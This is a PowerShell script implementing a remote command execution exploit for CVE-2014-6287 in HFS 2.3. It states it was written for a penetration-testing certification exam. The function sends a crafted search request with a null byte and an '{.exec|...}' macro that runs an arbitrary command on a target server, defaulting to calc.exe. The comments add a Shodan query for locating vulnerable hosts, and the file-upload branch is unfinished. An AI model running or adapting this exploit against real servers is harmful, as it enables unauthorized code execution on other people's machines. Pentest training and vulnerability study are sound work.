function Exploit-CVE-2014-6287
{ 
<#
.SYNOPSYS
Exploits CVE-2014-6287, which affects HFS servers versions 2.3. 

.DESCRIPTION
Orginally ported from https://www.exploit-db.com/exploits/39161/ This is an older exploit with a metasploit module, but I decided to port it to Powershell for practice and the PSSE
Showdan Search: httpfileserver 2.3

.PARAMETER Target
The IP Address of the target to exploit

.PARAMETER cmd
The arbitrary command to run

.PARAMATER file
The arbitrary file to upload and run

.EXAMPLE
Import-Module Exploit-CVE-2014-6287
Exploit-CVE-2014-6287 -Target 127.0.0.1:8080

.LINK
https://github.com/ahhh/PSSE/blob/master/Exploit-CVE-2014-6287.ps1
https://www.exploit-db.com/exploits/39161/
http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6287
https://github.com/rapid7/metasploit-framework/pull/3793
http://sourceforge.net/projects/hfs/

.NOTES
This script has been created for completing the requirements of the SecurityTube PowerShell for Penetration Testers Certification Exam
http://www.securitytube-training.com/online-courses/powershell-for-pentesters/
Student ID: PSP-3061d

#>
	[CmdletBinding()]
	Param (
	
		[Parameter(Mandatory=$false)]
		[String]
		$cmd = "c:/windows/system32/calc.exe",
		
		[Parameter(Mandatory=$true)]
		[String]
		$Target,

		[Parameter(Mandatory=$false)]
		[String]
		$File = $Null
	)


	if($File -eq $Null){
    $WebClient = New-Object Net.WebClient
    $execute = "http://$Target/?search=%00{.exec|$cmd.}"
    $webClient.DownloadString($execute)
}
  # This is where the arbitrary file upload and execute will go
  else{
    $WebClient = New-Object Net.WebClient
    $execute = "http://$Target/?search=%00{.exec|$cmd.}"
    $execute
    $webClient.DownloadString($execute)
  }

	
